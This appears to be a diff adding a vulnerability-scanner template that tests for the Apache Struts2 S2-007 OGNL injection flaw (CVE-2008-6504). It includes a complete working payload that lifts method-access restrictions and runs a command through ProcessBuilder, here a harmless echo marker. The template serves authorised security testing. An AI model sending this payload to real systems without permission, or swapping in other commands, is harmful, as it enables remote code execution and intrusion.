@@ -1,0 +1,49 @@
+id: local-struts2-s2-007-cmd-rce
+
+info:
+  name: Struts2 S2-007 Command Execution via Type Conversion OGNL (CVE-2008-6504)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-007 RCE via OGNL injection in the integer validation
+    type-conversion path. The age field value is spliced into an OGNL expression
+    as a string literal ('value'). The payload bypasses allowStaticMethodAccess
+    and denyMethodExecution restrictions, then runs echo via ProcessBuilder and
+    returns output using HttpServletResponse.getWriter().
+  reference:
+    - https://cwiki.apache.org/confluence/display/WW/S2-007
+    - https://nvd.nist.gov/vuln/detail/CVE-2008-6504
+  tags: safe-poc,exploit,struts2,s2-007,cve,cve2008,rce,ognl
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/user.action"
+      - "{{BaseURL}}/User.action"
+      - "{{BaseURL}}/index.action"
+    # Payload (URL-decoded for readability):
+    # age=' + (#_memberAccess["allowStaticMethodAccess"]=true,
+    #   #foo=new java.lang.Boolean("false"),
+    #   #context["xwork.MethodAccessor.denyMethodExecution"]=#foo,
+    #   #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","pentest-platform-s2007-rce"}))
+    #       .redirectErrorStream(true).start(),
+    #   #b=#a.getInputStream(),
+    #   #c=new java.io.InputStreamReader(#b),
+    #   #d=new java.io.BufferedReader(#c),
+    #   #e=new char[50000],#d.read(#e),
+    #   #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
+    #   #f.getWriter().println(new java.lang.String(#e)),
+    #   #f.getWriter().flush(),#f.getWriter().close()) + '
+    body: "age=%27+%2B+(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean(%22false%22)%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23a%3D(new+java.lang.ProcessBuilder(new+java.lang.String%5B%5D%7B%22echo%22%2C%22pentest-platform-s2007-rce%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew+java.io.InputStreamReader(%23b)%2C%23d%3Dnew+java.io.BufferedReader(%23c)%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new+java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close())+%2B+%27&name=foo&email=foo%40foo.com"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "pentest-platform-s2007-rce"
+      - type: status
+        status:
+          - 200
